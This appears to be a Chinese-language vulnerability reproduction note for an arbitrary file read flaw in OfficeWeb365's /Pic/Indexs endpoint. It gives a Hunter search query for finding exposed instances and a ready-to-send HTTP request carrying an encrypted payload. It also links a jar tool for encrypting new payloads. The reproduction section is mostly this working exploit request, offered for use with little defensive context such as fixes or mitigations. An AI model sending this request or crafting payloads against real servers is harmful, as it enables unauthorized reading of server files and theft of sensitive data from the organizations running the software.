# OfficeWeb365 Pic存在任意读取漏洞

# 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /Pic/Indexs接口处存在任意文件读取漏洞，攻击者可通过独特的加密方式对payload进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。

# 二、影响版本
+ OfficeWeb365

# 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`

![1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94.png](./img/Lvi5zs9BqmYWw8we/1692028029052-65569f24-4578-4a92-a007-d93c1b5b8f94-620163.png)

+ 登录页面

![1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636.png](./img/Lvi5zs9BqmYWw8we/1692028081742-18ce6201-05b3-4e01-a21c-4eca8dcf2636-180691.png)

# 四、漏洞复现
```http
GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1705158317873-5dd3158a-9b82-425f-a3a3-6d588f57aff0.png](./img/Lvi5zs9BqmYWw8we/1705158317873-5dd3158a-9b82-425f-a3a3-6d588f57aff0-908828.png)

[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222151369-ef2358bd-08df-4e87-92ee-c1b130128665.jar)

![1705158348583-85083a94-d61a-47a6-9280-2453025e7da7.png](./img/Lvi5zs9BqmYWw8we/1705158348583-85083a94-d61a-47a6-9280-2453025e7da7-397744.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ot9mxhmqtud1katb>